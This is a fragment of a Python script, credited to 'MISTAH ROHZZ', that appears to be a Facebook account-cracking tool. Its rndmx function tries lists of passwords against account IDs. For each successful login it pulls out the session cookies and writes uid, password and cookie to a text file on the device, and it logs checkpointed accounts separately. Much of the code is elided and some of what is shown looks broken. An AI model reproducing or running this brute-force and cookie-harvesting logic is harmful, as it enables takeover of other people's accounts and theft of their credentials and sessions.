#-----------------------[ INFO-CODE ]-----------------------#
"""Open By   : MISTAH ROHZZ
Developer : MISTAH ROHZZ
INSTAGRAM    : Mistahrohzz3
Status    : trail
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
...
def Main():
    ...
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/mistahrohzz3');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
...
def rndmx(ids,pasx,tl):
        ...
        try:
                for pas in pasx:
                        ...
                        po = requests.get('https://x.facebook.com/', cookies=cookies, headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} (Running) {str(uid)} | {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                open('/sdcard/Mistah-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'x.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (Fucking) {str(uid)} | {pas} ')
                                open('/sdcard/Mistah-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
